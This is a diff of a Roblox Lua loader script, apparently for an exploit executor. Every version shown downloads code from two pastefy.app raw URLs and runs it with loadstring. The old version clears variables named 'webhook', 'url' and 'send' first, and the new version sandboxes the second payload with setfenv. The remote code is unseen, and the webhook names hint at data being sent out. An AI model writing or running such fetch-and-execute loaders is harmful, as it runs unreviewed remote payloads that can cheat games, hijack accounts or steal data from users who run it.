@@ -1,20 +1,16 @@
--- Run first script
+-- Run first script normally
 loadstring(game:HttpGet("https://pastefy.app/YAiCtEd0/raw", true))()
 
-wait(2) -- Give it time to execute
+wait(2)
 
--- Clear any conflicting variables before running second script
-local env = getfenv()
-local backup = {}
+-- Create isolated environment for second script
+local secondScript = game:HttpGet("https://pastefy.app/Pt1O0Ijt/raw", true)
+local func = loadstring(secondScript)
 
--- Backup and remove potentially conflicting variables
-local conflicts = {"webhook", "Webhook", "WEBHOOK", "url", "Url", "URL", "send", "Send"}
-for _, var in pairs(conflicts) do
-    if env[var] ~= nil then
-        backup[var] = env[var]
-        env[var] = nil
-    end
+if func then
+    -- Run in separate environment
+    setfenv(func, {})
+    func()
+else
+    warn("Second script failed to compile")
 end
-
--- Now run second script
-loadstring(game:HttpGet("https://pastefy.app/Pt1O0Ijt/raw", true))()
